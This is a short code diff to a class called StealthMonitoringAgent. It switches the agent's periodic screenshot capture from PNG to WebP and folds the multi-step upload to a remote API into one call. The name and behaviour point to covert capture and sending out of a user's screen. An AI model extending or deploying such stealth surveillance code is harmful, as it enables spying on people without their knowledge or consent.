@@ -175,10 +175,8 @@ class StealthMonitoringAgent:
         self._next_screenshot_gap = self._screenshot_gap()
 
         try:
-            png = screenshot_mod.capture_png_bytes()
-            url_info = self.api.request_screenshot_url()
-            self.api.upload_screenshot_bytes(url_info["uploadURL"], png)
-            self.api.report_screenshot(url_info["storageKey"], _now_iso(), len(png))
+            img = screenshot_mod.capture_webp_bytes()
+            self.api.upload_screenshot(img, _now_iso(), content_type="image/webp")
         except Exception as exc:
             self._log(f"screenshot failed: {exc}")
 
